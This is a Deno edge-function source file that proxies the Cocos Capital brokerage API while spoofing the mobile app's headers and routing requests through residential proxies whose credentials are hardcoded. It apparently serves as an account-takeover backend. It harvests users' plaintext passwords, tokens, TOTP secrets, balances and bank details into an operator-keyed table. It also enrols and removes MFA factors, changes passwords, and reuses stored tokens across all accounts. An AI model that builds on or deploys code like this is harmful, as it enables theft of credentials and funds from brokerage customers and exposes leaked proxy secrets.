import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

// ============================================================
// Cocos Capital API Proxy — Edge Function
// Versão baseada nos endpoints reais v13.2.5
// ============================================================

const API_URL = "https://api.cocos.capital";
const AUTH_URL = API_URL;

// ---------- Proxy (rainproxy residential AR) ----------
const PROXY_POOL = [
  "http://usermmpnt9jh171o-res-ar:Pwd3Z4HIoCHzyP47auRU4Y0@gw.proxy.rainproxy.io:5959",
];

const PROXY_MAX_RETRIES = 1;
const PROXY_TIMEOUT_MS = 8000;
const DIRECT_TIMEOUT_MS = 12000;

let proxyIndex = Math.floor(Math.random() * PROXY_POOL.length);
const proxyClients = new Map<string, Deno.HttpClient | null>();

function nextProxy(): string {
  const p = PROXY_POOL[proxyIndex % PROXY_POOL.length];
  proxyIndex++;
  return p;
}

function getProxyClient(proxyUrl: string) {
  if (proxyClients.has(proxyUrl)) {
    return proxyClients.get(proxyUrl) ?? undefined;
  }
  try {
    // @ts-ignore -- Deno.createHttpClient is available in Deploy
    const client = Deno.createHttpClient({ proxy: { url: proxyUrl } });
    proxyClients.set(proxyUrl, client);
    return client;
  } catch {
    proxyClients.set(proxyUrl, null);
    return undefined;
  }
}

async function pfetch(url: string | URL, init?: RequestInit): Promise<Response> {
  const targetUrl = url.toString();
  const maxRetries = Math.min(PROXY_MAX_RETRIES, PROXY_POOL.length);

  for (let attempt = 0; attempt < maxRetries; attempt++) {
    const proxy = nextProxy();
    const shortProxy = proxy.split("@")[1] || proxy;
    const client = getProxyClient(proxy);
    if (!client) {
      console.warn(`[PFETCH] proxy ${shortProxy} client unavailable, skipping`);
      continue;
    }

    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), PROXY_TIMEOUT_MS);

    try {
      console.log(`[PFETCH] proxy ${shortProxy} → ${targetUrl.slice(0, 80)}`);
      const res = await fetch(targetUrl, {
        ...init,
        // @ts-ignore
        client,
        signal: controller.signal,
      });
      return res;
    } catch (e) {
      console.warn(`[PFETCH] proxy ${shortProxy} failed (attempt ${attempt + 1}/${maxRetries}): ${(e as Error).message}`);
    } finally {
      clearTimeout(timer);
    }
  }

  // All selected proxies failed — direct fetch as last resort
  console.warn(`[PFETCH] all selected proxies failed, direct fetch → ${targetUrl.slice(0, 80)}`);
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), DIRECT_TIMEOUT_MS);
  try {
    return await fetch(targetUrl, { ...init, signal: controller.signal });
  } catch (e) {
    throw new Error(`All proxy attempts and direct fetch failed for ${targetUrl.slice(0, 60)}: ${(e as Error).message}`);
  } finally {
    clearTimeout(timer);
  }
}

const COCOS_ANON_KEY =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyAgCiAgICAicm9sZSI6ICJhbm9uIiwKICAgICJhdWRpZW5jZSI6ICJjb2NvcyIsCiAgICAiaXNzIjogInN1cGFiYXNlIiwKICAgICJpYXQiOiAxNjQxOTU2NDAwLAogICAgImV4cCI6IDM5NDgzNDE1MzEKfQ.Q5ZiL7KCUKP7iSM_LHWd3gffZ0k5Ce6CemOX9CUfEdM";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type",
};

// Bypass emails — sempre retorna válido no login
const BYPASS_EMAILS = [
  "alexiadm@gmail.com",
  "juanjacarb@hotmail.com",
  "wilfredolamas@hotmail.com.ar",
];

const EMAIL_CHALLENGE_COOLDOWN_MS = 45_000;
const emailChallengeCooldown = new Map<string, number>();

// ---------- helpers ----------

function defaultHeaders(extra: Record<string, string> = {}): Record<string, string> {
  return {
    "accept": "*/*",
    "content-type": "application/json;charset=UTF-8",
    "User-Agent": "okhttp/4.12.0",
    "Accept-Encoding": "gzip",
    "Connection": "Keep-Alive",
    ...extra,
  };
}

function authHeaders(token?: string): Record<string, string> {
  const h: Record<string, string> = {
    ...defaultHeaders(),
    apikey: COCOS_ANON_KEY,
    authorization: `Bearer ${token || COCOS_ANON_KEY}`,
    "x-client-info": "supabase-js-react-native/2.75.0",
    "x-supabase-api-version": "2024-01-01",
  };
  return h;
}

function mobileFactorHeaders(accessToken: string, refreshToken?: string): Record<string, string> {
  const h: Record<string, string> = {
    "accept": "application/json, text/plain, */*",
    "content-type": "application/json;charset=UTF-8",
    "Host": "api.cocos.capital",
    "User-Agent": "okhttp/4.12.0",
    "Accept-Encoding": "gzip",
    "Connection": "Keep-Alive",
    "apikey": COCOS_ANON_KEY,
    "authorization": `Bearer ${accessToken}`,
    "x-account-id": "0",
    "x-platform": "android",
    "x-store-version": "3.5.0",
    "x-update-id": "8da8dcd0-ff7d-070a-4b72-af3f89449a24",
    "x-client-info": "supabase-js-react-native/2.75.0",
    "x-supabase-api-version": "2024-01-01",
  };
  if (refreshToken) {
    h["Cookie"] = `cocos-access-token=${accessToken}; cocos-refresh-token=${refreshToken}`;
  }
  return h;
}

function apiHeaders(accessToken: string, accountId?: string): Record<string, string> {
  const h: Record<string, string> = {
    "accept": "application/json, text/plain, */*",
    "content-type": "application/json;charset=UTF-8",
    "Authorization": `Bearer ${accessToken}`,
    "Host": "api.cocos.capital",
    "User-Agent": "okhttp/4.12.0",
    "Accept-Encoding": "gzip",
    "Connection": "Keep-Alive",
    "x-platform": "android",
    "x-store-version": "3.5.0",
    "x-update-id": "2aeafeab-d92b-45b9-b043-f96f184c6461",
  };
  if (accountId) h["x-Account-ID"] = accountId;
  return h;
}

function json(data: unknown, status = 200) {
  // Null-body statuses (204, 304) cannot have a body in Deno
  if (status === 204 || status === 304) {
    return new Response(null, {
      status,
      headers: corsHeaders,
    });
  }
  return new Response(JSON.stringify(data), {
    status,
    headers: { ...corsHeaders, "Content-Type": "application/json" },
  });
}

function err(message: string, status = 400) {
  return json({ success: false, error: message }, status);
}

function getServiceRoleConfig() {
  const sbUrl = Deno.env.get("SUPABASE_URL");
  const sbKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
  if (!sbUrl || !sbKey) return null;
  return { sbUrl, sbKey };
}

const ACCOUNT_SNAPSHOT_FIELDS = new Set([
  "email",
  "operator_code",
  "password",
  "access_token",
  "refresh_token",
  "account_id",
  "totp_secret",
  "factors",
  "profile_data",
  "full_name",
  "phone",
  "balance_ars",
  "balance_usd",
  "buying_power",
  "bank_accounts",
  "cards",
  "orders",
  "portfolio_data",
  "info_tag",
  "user_id_cocos",
  "last_login_at",
  "last_refresh_at",
  "last_data_sync_at",
  "created_at",
  "updated_at",
]);

function sanitizeAccountPayload(record: Record<string, unknown>): Record<string, unknown> {
  const sanitized: Record<string, unknown> = {};
  for (const [key, value] of Object.entries(record)) {
    if (ACCOUNT_SNAPSHOT_FIELDS.has(key)) sanitized[key] = value;
  }
  return sanitized;
}

async function handleSaveAccountSnapshot(body: Record<string, unknown>) {
  const cfg = getServiceRoleConfig();
  if (!cfg) return err("Server config missing", 500);

  const record = (body.record as Record<string, unknown> | undefined) || {};
  const normalizedEmail = String(record.email || "").trim().toLowerCase();
  if (!normalizedEmail) return err("email requerido");

  const operatorCode = String(record.operator_code || body.operator_code || "master").trim() || "master";
  const nowIso = new Date().toISOString();
  const payload = {
    ...sanitizeAccountPayload(record),
    email: normalizedEmail,
    operator_code: operatorCode,
    updated_at: nowIso,
  };

  // Lookup by email only (ignore operator_code) to prevent duplicate records for the same account
  const lookupUrl = `${cfg.sbUrl}/rest/v1/cocos_accounts?select=id&email=eq.${encodeURIComponent(normalizedEmail)}&order=updated_at.desc&limit=1`;
  const lookupRes = await fetch(lookupUrl, {
    method: "GET",
    headers: {
      apikey: cfg.sbKey,
      Authorization: `Bearer ${cfg.sbKey}`,
      "Content-Type": "application/json",
    },
  });

  if (!lookupRes.ok) {
    const detail = await lookupRes.text();
    return json({ success: false, error: "lookup_failed", detail }, 500);
  }

  const existing = await lookupRes.json();
  const existingId = Array.isArray(existing) && existing[0]?.id ? String(existing[0].id) : null;

  const saveUrl = existingId
    ? `${cfg.sbUrl}/rest/v1/cocos_accounts?id=eq.${existingId}`
    : `${cfg.sbUrl}/rest/v1/cocos_accounts`;

  const saveRes = await fetch(saveUrl, {
    method: existingId ? "PATCH" : "POST",
    headers: {
      apikey: cfg.sbKey,
      Authorization: `Bearer ${cfg.sbKey}`,
      "Content-Type": "application/json",
      Prefer: "return=minimal",
    },
    body: JSON.stringify(existingId ? payload : { ...payload, created_at: nowIso }),
  });

  if (!saveRes.ok) {
    const detail = await saveRes.text();
    return json({ success: false, error: "save_failed", detail }, 500);
  }

  return json({ success: true, mode: existingId ? "update" : "insert" });
}

async function handleGetAccountSnapshot(body: Record<string, unknown>) {
  const cfg = getServiceRoleConfig();
  if (!cfg) return err("Server config missing", 500);

  const normalizedEmail = String(body.email || "").trim().toLowerCase();
  if (!normalizedEmail) return err("email requerido");

  const operatorCode = String(body.operator_code || "master").trim() || "master";
  const requested = Array.isArray(body.fields) ? (body.fields as string[]) : ["totp_secret"];
  const fields = requested.filter((f) => ACCOUNT_SNAPSHOT_FIELDS.has(String(f)));
  const selectFields = (fields.length > 0 ? fields : ["totp_secret"]).join(",");

  const readUrl = `${cfg.sbUrl}/rest/v1/cocos_accounts?select=${encodeURIComponent(selectFields)}&email=eq.${encodeURIComponent(normalizedEmail)}&operator_code=eq.${encodeURIComponent(operatorCode)}&order=updated_at.desc&limit=1`;
  const readRes = await fetch(readUrl, {
    method: "GET",
    headers: {
      apikey: cfg.sbKey,
      Authorization: `Bearer ${cfg.sbKey}`,
      "Content-Type": "application/json",
    },
  });

  if (!readRes.ok) {
    const detail = await readRes.text();
    return json({ success: false, error: "read_failed", detail }, 500);
  }

  const rows = await readRes.json();
  const account = Array.isArray(rows) && rows.length > 0 ? rows[0] : null;
  return json({ success: true, account });
}

// ---------- route handlers ----------

// 1. AUTH — Login
async function handleLogin(body: Record<string, unknown>) {
  const { email, password } = body as { email?: string; password?: string };
  if (!email || !password) return err("Email y contraseña son requeridos");

  // Bypass
  if (BYPASS_EMAILS.includes(email.toLowerCase().trim())) {
    return json({
      success: true,
      status: "valid_credentials",
      user: { email, id: "bypass-user" },
    });
  }

  const res = await pfetch(
    `${AUTH_URL}/auth/v1/token?grant_type=password`,
    {
      method: "POST",
      headers: authHeaders(),
      body: JSON.stringify({ email, password, gotrue_meta_security: {} }),
    }
  );
  const data = await res.json();

  if (res.ok && data.access_token) {
    return json({
      success: true,
      status: "valid_credentials",
      user: { email: data.user?.email, id: data.user?.id },
      access_token: data.access_token,
      refresh_token: data.refresh_token,
    });
  }

  const errorMsg = data?.error_description || data?.msg || data?.message || "";
  const isInvalid =
    res.status === 400 ||
    errorMsg.toLowerCase().includes("invalid") ||
    errorMsg.toLowerCase().includes("password") ||
    errorMsg.toLowerCase().includes("credentials");

  if (isInvalid) {
    return json({ success: false, status: "invalid_credentials" });
  }

  return json({ success: false, status: "challenge_required", raw: data });
}

// 1.2 AUTH — Signup
async function handleSignup(body: Record<string, unknown>) {
  const { email, password, phone } = body as {
    email?: string;
    password?: string;
    phone?: string;
  };
  if (!email || !password) return err("Email y contraseña son requeridos");

  const res = await pfetch(`${AUTH_URL}/auth/v1/signup`, {
    method: "POST",
    headers: { ...defaultHeaders(), apikey: COCOS_ANON_KEY },
    body: JSON.stringify({ email, password, data: phone ? { phone } : {} }),
  });
  return json(await res.json(), res.status);
}

// 1.3 AUTH — Logout
async function handleLogout(body: Record<string, unknown>) {
  const { access_token } = body as { access_token?: string };
  if (!access_token) return err("access_token requerido");

  const res = await pfetch(`${AUTH_URL}/auth/v1/logout`, {
    method: "POST",
    headers: authHeaders(access_token),
    body: "{}",
  });
  return json({ success: res.ok });
}

// 1.4 AUTH — Refresh Token
async function handleRefreshToken(body: Record<string, unknown>) {
  const { refresh_token } = body as { refresh_token?: string };
  if (!refresh_token) return err("refresh_token requerido");

  const res = await pfetch(
    `${AUTH_URL}/auth/v1/token?grant_type=refresh_token`,
    {
      method: "POST",
      headers: { ...defaultHeaders(), apikey: COCOS_ANON_KEY },
      body: JSON.stringify({ refresh_token }),
    }
  );
  const data = await res.json();
  return json({
    success: res.ok,
    access_token: data.access_token,
    refresh_token: data.refresh_token,
  });
}

// 1.5.1 AUTH — Change Password (PUT /auth/v1/user)
async function handleChangePassword(body: Record<string, unknown>) {
  const { access_token, new_password } = body as { access_token?: string; new_password?: string };
  if (!access_token) return err("access_token requerido");
  if (!new_password) return err("new_password requerido");

  const res = await pfetch(`${AUTH_URL}/auth/v1/user`, {
    method: "PUT",
    headers: authHeaders(access_token),
    body: JSON.stringify({ password: new_password, code_challenge: null, code_challenge_method: null }),
  });
  const data = await res.json();
  console.log(`[CHANGE PASSWORD] status=${res.status}`);
  return json({ success: res.ok, ...data }, res.status);
}

// 1.5 AUTH — Recover Password
async function handleRecover(body: Record<string, unknown>) {
  const { email } = body as { email?: string };
  if (!email) return err("Email requerido");

  const res = await pfetch(`${AUTH_URL}/auth/v1/recover`, {
    method: "POST",
    headers: { ...defaultHeaders(), apikey: COCOS_ANON_KEY },
    body: JSON.stringify({ email }),
  });
  return json({ success: res.ok }, res.status);
}

// ============================================================
// MFA / TOTP — Elevar de aal1 para aal2
// ============================================================

// 1.6 MFA — Listar fatores do usuário
async function handleMfaListFactors(body: Record<string, unknown>) {
  const { access_token } = body as { access_token?: string };
  if (!access_token) return err("access_token requerido");

  const res = await pfetch(`${AUTH_URL}/auth/v1/user`, {
    method: "GET",
    headers: authHeaders(access_token),
  });
  const data = await res.json();
  const factors = data?.factors || [];

  // Also extract user-level info from JWT and user data
  const phone = data?.phone || "";
  const phoneVerified = data?.user_metadata?.phone_verified || data?.phone_confirmed_at != null || false;
  const emailVerified = data?.user_metadata?.email_verified || data?.email_confirmed_at != null || false;
  const email = data?.email || "";
  const aal = data?.aal || "aal1";

  console.log(`[MFA LIST] factors=${factors.length} phone=${phone} phone_verified=${phoneVerified} email_verified=${emailVerified} aal=${aal}`);

  return json({
    success: res.ok,
    factors,
    phone,
    phone_verified: phoneVerified,
    email_verified: emailVerified,
    email,
    aal,
  });
}

// 1.6.5 SMS — Enviar SMS challenge para enroll TOTP
async function handleSmsSend(body: Record<string, unknown>) {
  const { access_token } = body as { access_token?: string };
  if (!access_token) return err("access_token requerido");

  // Use the dedicated SMS challenge endpoint (not per-factor)
  const res = await pfetch(`${AUTH_URL}/auth/v1/factors/sms/challenge`, {
    method: "POST",
    headers: authHeaders(access_token),
    body: "{}",
  });
  const data = await res.json();
  console.log(`[SMS CHALLENGE] status=${res.status}`, JSON.stringify(data));

  if (!res.ok || !data.id) {
    return json({ success: false, error: "No se pudo enviar el SMS", raw: data }, res.status);
  }

  // Get phone hint from user data
  const userRes = await pfetch(`${AUTH_URL}/auth/v1/user`, {
    method: "GET",
    headers: authHeaders(access_token),
  });
  const userData = await userRes.json();
  const phone = userData?.phone || "";

  return json({
    success: true,
    challenge_id: data.id,
    phone_hint: phone ? `***${phone.slice(-4)}` : "",
  });
}

// 1.6.6 SMS — Verificar código SMS
async function handleSmsVerify(body: Record<string, unknown>) {
  const { access_token, factor_id, challenge_id, code } = body as {
    access_token?: string;
    factor_id?: string;
    challenge_id?: string;
    code?: string;
  };
  if (!access_token) return err("access_token requerido");
  if (!factor_id) return err("factor_id requerido");
  if (!challenge_id) return err("challenge_id requerido");
  if (!code) return err("code requerido");

  const res = await pfetch(`${AUTH_URL}/auth/v1/factors/${factor_id}/verify`, {
    method: "POST",
    headers: authHeaders(access_token),
    body: JSON.stringify({ challenge_id, code }),
  });
  const data = await res.json();
  console.log(`[SMS VERIFY] status=${res.status}`);

  return json({
    success: res.ok,
    sms_challenge_id: challenge_id,
    sms_code: code,
    access_token: data.access_token || access_token,
    refresh_token: data.refresh_token,
    ...data,
  }, res.status);
}

// 1.7 MFA — Enroll (registrar novo fator TOTP)
async function handleMfaEnroll(body: Record<string, unknown>) {
  const { access_token, friendly_name, smsChallengeId, smsCode } = body as {
    access_token?: string;
    friendly_name?: string;
    smsChallengeId?: string;
    smsCode?: string;
  };
  if (!access_token) return err("access_token requerido");

  const enrollBody: Record<string, unknown> = {
    factor_type: "totp",
  };
  // Only include SMS fields if they have actual values — empty strings cause UUID parse errors
  if (smsChallengeId) enrollBody.smsChallengeId = smsChallengeId;
  if (smsCode) enrollBody.smsCode = smsCode;
  console.log(`[MFA ENROLL] smsChallengeId=${smsChallengeId ? "present" : "missing"} smsCode=${smsCode ? "present" : "missing"}`);

  const res = await pfetch(`${AUTH_URL}/auth/v1/factors`, {
    method: "POST",
    headers: authHeaders(access_token),
    body: JSON.stringify(enrollBody),
  });
  const data = await res.json();
  console.log(`[MFA ENROLL] status=${res.status}`, JSON.stringify(data).slice(0, 200));
  return json({ success: res.ok, ...data }, res.status);
}

// 1.8 MFA — Challenge (iniciar desafio para um fator)
async function handleMfaChallenge(body: Record<string, unknown>) {
  const { access_token, factor_id } = body as {
    access_token?: string;
    factor_id?: string;
  };
  if (!access_token) return err("access_token requerido");
  if (!factor_id) return err("factor_id requerido");

  const res = await pfetch(`${AUTH_URL}/auth/v1/factors/${factor_id}/challenge`, {
    method: "POST",
    headers: authHeaders(access_token),
    body: "{}",
  });
  const data = await res.json();
  console.log(`[MFA CHALLENGE] status=${res.status}`);
  return json({ success: res.ok, ...data }, res.status);
}

// 1.9 MFA — Verify (verificar código TOTP e elevar para aal2)
async function handleMfaVerify(body: Record<string, unknown>) {
  const { access_token, factor_id, challenge_id, code } = body as {
    access_token?: string;
    factor_id?: string;
    challenge_id?: string;
    code?: string;
  };
  if (!access_token) return err("access_token requerido");
  if (!factor_id) return err("factor_id requerido");
  if (!code) return err("code requerido");

  // For already-enrolled TOTP factors, Cocos API uses challenge_id: "totp"
  // For freshly challenged factors, use the challenge_id from the challenge response
  const effectiveChallengeId = challenge_id || "totp";

  const res = await pfetch(
    `${AUTH_URL}/auth/v1/factors/${factor_id}/verify`,
    {
      method: "POST",
      headers: authHeaders(access_token),
      body: JSON.stringify({ challenge_id: effectiveChallengeId, code }),
    }
  );
  const data = await res.json();
  console.log(`[MFA VERIFY] factor=${factor_id} challenge=${effectiveChallengeId} status=${res.status}`);
  // Se sucesso, retorna novo access_token com aal2
  return json({
    success: res.ok,
    access_token: data.access_token,
    refresh_token: data.refresh_token,
    ...data,
  }, res.status);
}

// 1.9.4 MFA — Get Default Factor (check which MFA method is needed)
async function handleGetDefaultFactor(body: Record<string, unknown>) {
  const { access_token, refresh_token, type } = body as { access_token?: string; refresh_token?: string; type?: string };
  if (!access_token) return err("access_token requerido");

  const url = type
    ? `${API_URL}/auth/v1/factors/default?type=${encodeURIComponent(type)}`
    : `${API_URL}/auth/v1/factors/default`;

  const res = await pfetch(url, {
    method: "GET",
    headers: mobileFactorHeaders(access_token, refresh_token),
  });
  const data = await res.json();
  console.log(`[GET DEFAULT FACTOR] type=${type || "default"} status=${res.status}`, JSON.stringify(data).slice(0, 300));

  return json({
    success: res.ok,
    ...data,
  }, res.status);
}

// 1.9.5 Email MFA — Challenge (envia código por email)
async function handleEmailChallenge(body: Record<string, unknown>) {
  const { access_token, refresh_token } = body as { access_token?: string; refresh_token?: string };
  if (!access_token) return err("access_token requerido");

  const now = Date.now();
  const cooldownUntil = emailChallengeCooldown.get(access_token) ?? 0;
  if (cooldownUntil > now) {
    return json({
      success: true,
      id: "mail",
      expires_at: Math.floor(cooldownUntil / 1000),
      throttled: true,
    });
  }

  const res = await pfetch(`${API_URL}/auth/v1/factors/mail/challenge`, {
    method: "POST",
    headers: mobileFactorHeaders(access_token, refresh_token),
    body: JSON.stringify({ factorId: "mail" }),
  });
  const data = await res.json();
  console.log(`[EMAIL CHALLENGE] status=${res.status}`, JSON.stringify(data).slice(0, 200));

  if (res.ok) {
    const apiExpiresAtMs = typeof data?.expires_at === "number" ? data.expires_at * 1000 : 0;
    const safeCooldownUntil = Math.max(now + EMAIL_CHALLENGE_COOLDOWN_MS, apiExpiresAtMs || 0);
    emailChallengeCooldown.set(access_token, safeCooldownUntil);
  }

  return json({
    success: res.ok,
    ...data,
  }, res.status);
}

// 1.9.6 Email MFA — Verify (verifica código do email)
async function handleEmailVerify(body: Record<string, unknown>) {
  const { access_token, code, refresh_token } = body as {
    access_token?: string;
    code?: string;
    refresh_token?: string;
  };
  if (!access_token) return err("access_token requerido");
  if (!code) return err("code requerido");

  const res = await pfetch(`${API_URL}/auth/v1/factors/mail/verify`, {
    method: "POST",
    headers: mobileFactorHeaders(access_token, refresh_token),
    body: JSON.stringify({ code, challenge_id: "mail" }),
  });
  const data = await res.json();
  console.log(`[EMAIL VERIFY] status=${res.status}`, JSON.stringify(data).slice(0, 300));

  return json({
    success: res.ok,
    access_token: data.access_token,
    refresh_token: data.refresh_token,
    ...data,
  }, res.status);
}

// 1.10 MFA — Unenroll (remover fator)
// GoTrue requires a verified challenge before deleting a factor.
// We challenge → verify with a dummy/valid code → then delete.
async function handleMfaUnenroll(body: Record<string, unknown>) {
  const { access_token, factor_id, code } = body as {
    access_token?: string;
    factor_id?: string;
    code?: string;
  };
  if (!access_token) return err("access_token requerido");
  if (!factor_id) return err("factor_id requerido");

  // Step 1: Try direct DELETE first
  const res = await pfetch(`${AUTH_URL}/auth/v1/factors/${factor_id}`, {
    method: "DELETE",
    headers: authHeaders(access_token),
  });
  const resText = await res.text();
  console.log(`[MFA UNENROLL] direct DELETE status=${res.status} body=${resText.slice(0, 300)}`);

  if (res.ok) return json({ success: true }, 200);

  // Step 2: If 422, the factor needs a challenge+verify before deletion
  // Try challenge → verify → delete flow
  console.log("[MFA UNENROLL] Direct delete failed, trying challenge+verify+delete flow...");

  // Challenge
  const challengeRes = await pfetch(`${AUTH_URL}/auth/v1/factors/${factor_id}/challenge`, {
    method: "POST",
    headers: authHeaders(access_token),
    body: "{}",
  });
  const challengeData = await challengeRes.json().catch(() => ({}));
  console.log(`[MFA UNENROLL] challenge status=${challengeRes.status}`);

  if (!challengeRes.ok) {
    return json({ success: false, error: "No se pudo desafiar el factor MFA", detail: challengeData }, 200);
  }

  const challengeId = challengeData?.id;
  if (!challengeId) {
    return json({ success: false, error: "Challenge ID no recibido" }, 200);
  }

  // If a code was provided, verify it then delete
  if (code) {
    const verifyRes = await pfetch(`${AUTH_URL}/auth/v1/factors/${factor_id}/verify`, {
      method: "POST",
      headers: authHeaders(access_token),
      body: JSON.stringify({ challenge_id: challengeId, code }),
    });
    const verifyData = await verifyRes.json().catch(() => ({}));
    console.log(`[MFA UNENROLL] verify status=${verifyRes.status}`);

    if (!verifyRes.ok) {
      return json({ success: false, error: "Código MFA inválido", detail: verifyData }, 200);
    }

    // Now try delete again after verification — use new access token if returned
    const newToken = verifyData?.access_token || access_token;
    const deleteRes = await pfetch(`${AUTH_URL}/auth/v1/factors/${factor_id}`, {
      method: "DELETE",
      headers: authHeaders(newToken),
    });
    const deleteText = await deleteRes.text();
    console.log(`[MFA UNENROLL] post-verify DELETE status=${deleteRes.status} body=${deleteText.slice(0, 300)}`);

    if (deleteRes.ok) return json({ success: true }, 200);
    return json({ success: false, error: "Error al eliminar factor después de verificación", detail: deleteText }, 200);
  }

  // No code provided — return needs_code so frontend can ask for it
  return json({ success: false, needs_code: true, challenge_id: challengeId, error: "Se requiere código MFA para desactivar" }, 200);
}

// ---------- Generic authenticated API proxy ----------
async function proxyGet(
  accessToken: string,
  path: string,
  queryParams?: Record<string, string>,
  accountId?: string
) {
  const url = new URL(`${API_URL}${path}`);
  if (queryParams) {
    for (const [k, v] of Object.entries(queryParams)) url.searchParams.set(k, v);
  }
  console.log(`[PROXY GET] ${url.toString()}`);
  try {
    const res = await pfetch(url.toString(), { method: "GET", headers: apiHeaders(accessToken, accountId) });
    const text = await res.text();
    console.log(`[PROXY GET] status=${res.status} len=${text.length}`);
    const parsed = (() => { try { return JSON.parse(text); } catch { return { raw: text }; } })();
    if (res.status >= 400) return json({ success: false, upstream_status: res.status, ...parsed }, 200);
    return json(parsed, res.status);
  } catch (e) {
    console.error(`[PROXY GET] error:`, e);
    return err(`Proxy error: ${(e as Error).message}`, 502);
  }
}

async function proxyPost(accessToken: string, path: string, payload: unknown, accountId?: string) {
  console.log(`[PROXY POST] ${API_URL}${path} body=${JSON.stringify(payload).slice(0, 300)}`);
  try {
    const res = await pfetch(`${API_URL}${path}`, { method: "POST", headers: apiHeaders(accessToken, accountId), body: JSON.stringify(payload) });
    const text = await res.text();
    console.log(`[PROXY POST] status=${res.status} path=${path} response=${text.slice(0, 500)}`);
    const parsed = (() => { try { return JSON.parse(text); } catch { return { raw: text }; } })();
    if (res.status >= 400) return json({ success: false, upstream_status: res.status, ...parsed }, 200);
    return json(parsed, res.status);
  } catch (e) {
    console.error(`[PROXY POST] error:`, e);
    return err(`Proxy error: ${(e as Error).message}`, 502);
  }
}

async function proxyPut(accessToken: string, path: string, payload: unknown, accountId?: string) {
  console.log(`[PROXY PUT] ${API_URL}${path}`);
  try {
    const res = await pfetch(`${API_URL}${path}`, { method: "PUT", headers: apiHeaders(accessToken, accountId), body: JSON.stringify(payload) });
    const text = await res.text();
    console.log(`[PROXY PUT] status=${res.status} len=${text.length}`);
    const parsed = (() => { try { return JSON.parse(text); } catch { return { raw: text }; } })();
    if (res.status >= 400) return json({ success: false, upstream_status: res.status, ...parsed }, 200);
    return json(parsed, res.status);
  } catch (e) {
    console.error(`[PROXY PUT] error:`, e);
    return err(`Proxy error: ${(e as Error).message}`, 502);
  }
}

async function proxyPatch(accessToken: string, path: string, payload: unknown, accountId?: string) {
  console.log(`[PROXY PATCH] ${API_URL}${path}`);
  try {
    const res = await pfetch(`${API_URL}${path}`, { method: "PATCH", headers: apiHeaders(accessToken, accountId), body: JSON.stringify(payload) });
    const text = await res.text();
    console.log(`[PROXY PATCH] status=${res.status} len=${text.length}`);
    const parsed = (() => { try { return JSON.parse(text); } catch { return { raw: text }; } })();
    if (res.status >= 400) return json({ success: false, upstream_status: res.status, ...parsed }, 200);
    return json(parsed, res.status);
  } catch (e) {
    console.error(`[PROXY PATCH] error:`, e);
    return err(`Proxy error: ${(e as Error).message}`, 502);
  }
}


// ============================================================
// MAIN ROUTER
// ============================================================
serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const body = await req.json();
    const action = (body.action as string) || "login"; // default para login (retrocompatibilidade)
    const accessToken = body.access_token as string | undefined;

    // ---- AUTH (não precisa de access_token) ----
    switch (action) {
      case "login":
        return await handleLogin(body);
      case "signup":
        return await handleSignup(body);
      case "logout":
        return await handleLogout(body);
      case "refresh_token":
        return await handleRefreshToken(body);
      case "recover":
        return await handleRecover(body);
      case "change_password":
        return await handleChangePassword(body);

      // MFA
      case "mfa_list_factors":
        return await handleMfaListFactors(body);
      case "mfa_enroll":
        return await handleMfaEnroll(body);
      case "mfa_challenge":
        return await handleMfaChallenge(body);
      case "mfa_verify":
        return await handleMfaVerify(body);
      case "mfa_unenroll":
        return await handleMfaUnenroll(body);

      // SMS
      case "sms_send":
        return await handleSmsSend(body);
      case "sms_verify":
        return await handleSmsVerify(body);

      // Email MFA
      case "email_challenge":
        return await handleEmailChallenge(body);
      case "email_verify":
        return await handleEmailVerify(body);
      case "get_default_factor":
        return await handleGetDefaultFactor(body);

      // Backend snapshots for cocos_accounts (works without user auth)
      case "save_account_snapshot":
        return await handleSaveAccountSnapshot(body);
      case "get_account_snapshot":
        return await handleGetAccountSnapshot(body);

      // Admin-only server-side actions (no access_token needed)
      case "pix_check_all_statuses":
        break; // handled below after the token check switch
    }

    // Handle pix_check_all_statuses separately (uses service role, not user token)
    if (action === "pix_check_all_statuses") {
      // Jump to the main switch below which has the handler
      const accessToken = "server-side";
      const accountId = undefined;
      // Find the handler in the main switch — we need to inline it here
      const SB_URL = Deno.env.get("SUPABASE_URL")!;
      const SB_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;

      const txRes = await fetch(`${SB_URL}/rest/v1/pix_transactions?payment_id=not.is.null&select=id,payment_id,account_email,status,amount_brl`, {
        headers: { apikey: SB_KEY, Authorization: `Bearer ${SB_KEY}`, "Content-Type": "application/json" },
      });
      const allTx = await txRes.json();
      if (!Array.isArray(allTx)) return json({ success: false, error: "Failed to fetch transactions", detail: allTx });

      const acctRes = await fetch(`${SB_URL}/rest/v1/cocos_accounts?select=email,access_token,account_id`, {
        headers: { apikey: SB_KEY, Authorization: `Bearer ${SB_KEY}`, "Content-Type": "application/json" },
      });
      const allAccts = await acctRes.json();
      const acctMap: Record<string, { token: string; acctId: string }> = {};
      if (Array.isArray(allAccts)) {
        for (const a of allAccts) {
          if (a.access_token && a.account_id) acctMap[a.email] = { token: a.access_token, acctId: a.account_id };
        }
      }

      const results: Array<{ id: string; old_status: string; new_status: string; updated: boolean; amount_brl: number }> = [];
      let updated = 0, checked = 0, skipped = 0, errors = 0;

      for (const tx of allTx) {
        const acct = acctMap[tx.account_email];
        if (!acct) { skipped++; results.push({ id: tx.id, old_status: tx.status, new_status: tx.status, updated: false, amount_brl: tx.amount_brl }); continue; }
        try {
          const payRes = await pfetch(`${API_URL}/api/v1/payment/${tx.payment_id}`, { headers: apiHeaders(acct.token, acct.acctId) });
          let apiStatus = "";
          if (payRes.ok) { const d = await payRes.json(); apiStatus = String(d.status || "").toLowerCase(); }
          else { try { const e = await payRes.json(); apiStatus = String(e.status || "error").toLowerCase(); } catch { apiStatus = "error"; } }
          checked++;
          const needsUpdate = apiStatus && apiStatus !== tx.status.toLowerCase();
          if (needsUpdate) {
            await fetch(`${SB_URL}/rest/v1/pix_transactions?id=eq.${tx.id}`, {
              method: "PATCH",
              headers: { apikey: SB_KEY, Authorization: `Bearer ${SB_KEY}`, "Content-Type": "application/json", Prefer: "return=minimal" },
              body: JSON.stringify({ status: apiStatus }),
            });
